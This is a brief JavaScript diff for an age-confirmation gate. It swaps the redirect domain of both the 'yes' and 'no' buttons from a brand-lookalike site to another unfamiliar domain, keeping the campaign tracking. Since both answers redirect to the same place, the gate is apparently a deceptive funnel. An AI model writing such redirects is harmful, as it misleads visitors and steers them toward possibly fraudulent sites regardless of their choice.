@@ -65,10 +65,11 @@ if(form){
 
   // Handle button clicks
   document.getElementById('age-confirm-yes').addEventListener('click', () => {
-    window.location.href = 'https://ferreroo.site/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]';
+    window.location.href = 'https://h2n6.com/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]';
   });
 
   document.getElementById('age-confirm-no').addEventListener('click', () => {
-    window.location.href = 'https://ferreroo.site/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]';
+    window.location.href = 'https://h2n6.com/?utm_campaign=rdeLCgSOCD&v1=[v1]&v2=[v2]&v3=[v3]';
   });
 })();
+
